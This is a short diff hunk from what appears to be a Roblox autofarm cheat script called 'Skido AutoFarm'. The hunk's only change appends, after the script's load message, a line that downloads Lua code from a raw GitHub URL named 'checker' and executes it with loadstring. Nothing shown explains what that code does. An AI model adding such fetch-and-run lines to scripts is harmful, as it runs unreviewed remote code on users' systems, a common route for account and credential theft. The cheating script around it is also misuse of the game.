@@ -2066,5 +2066,6 @@ LocalPlayer.CharacterAdded:Connect(function(char)
 end)
 
 print("Skido AutoFarm loaded - Server Hop Removed.")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YuvicHaha/ui3/refs/heads/main/checker"))()
 
  
